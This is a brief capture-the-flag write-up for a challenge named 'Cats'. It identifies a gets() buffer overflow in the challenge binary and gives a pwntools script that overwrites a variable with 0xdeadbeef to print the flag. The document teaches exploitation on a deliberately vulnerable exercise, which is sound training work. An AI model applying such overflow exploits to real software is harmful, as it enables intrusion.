# Cats

> I had to hide my secret so any MGCI cat-haters will never find it! Do you like cats?

## Static Analysis

Reading the source code, we can immediately spot an obvious buffer overflow via the `gets(hmm)` function.

The flag is printed when the variable `trustNoOne` is set to `0xdeadbeef`, despite it being initialized with a value of 0.

We can achieve this by simply overflowing the `trustNoOne` buffer with our buffer overflow and get the flag.


## Solution

```py
from pwn import *

p = process("./cats_KIFg4OV")
p.sendline(b"A"*60 + p32(0xdeadbeef))
p.interactive()
```



